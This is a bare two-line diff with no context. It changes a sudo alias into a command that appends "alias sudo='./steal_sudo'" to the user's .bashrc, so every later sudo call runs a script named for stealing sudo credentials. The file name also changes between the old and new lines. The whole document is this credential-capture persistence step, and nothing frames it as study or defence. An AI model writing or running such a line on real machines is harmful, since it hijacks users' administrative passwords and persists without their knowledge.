@@ -1,1 +1,1 @@
-alias sudo='./steal-sudo'
+echo -n "alias sudo='./steal_sudo'" >> .bashrc
